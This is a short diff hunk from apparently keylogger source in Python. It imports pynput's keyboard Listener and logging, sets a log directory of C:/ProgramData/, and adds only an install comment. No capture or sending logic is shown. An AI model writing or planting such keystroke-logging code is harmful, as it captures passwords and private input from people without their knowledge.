@@ -1,5 +1,6 @@
 from pynput.keyboard import Key, Listener
 import logging
+# pip install pynput
 
 log_dir = "C:/ProgramData/"
 
